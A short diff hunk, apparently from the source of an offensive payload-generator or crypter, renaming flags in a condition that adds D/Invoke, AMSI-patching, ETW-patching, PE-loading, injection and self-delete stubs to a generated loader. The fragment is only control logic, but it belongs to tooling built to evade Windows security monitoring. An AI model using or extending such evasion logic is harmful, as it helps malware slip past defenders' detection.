@@ -2085,7 +2085,7 @@ stub.add(Cryptstub3)
 stub.add(getRandStub())
 stub.add(getRandStub())
 
-if (AMSI or AMSIProviderPatch or ETW or peload or (localinject == false) or selfdelete):
+if (AMSIPatch or AMSIProviderPatch or ETWPatch or peload or (localinject == false) or selfdelete):
     if (not noDInvoke): stub.add(DInvokeLoadLibraryAGetProcAddress)
     if (selfdelete):
         if (not noDInvoke): stub.add(DInvokeSelfDeleteStubs)
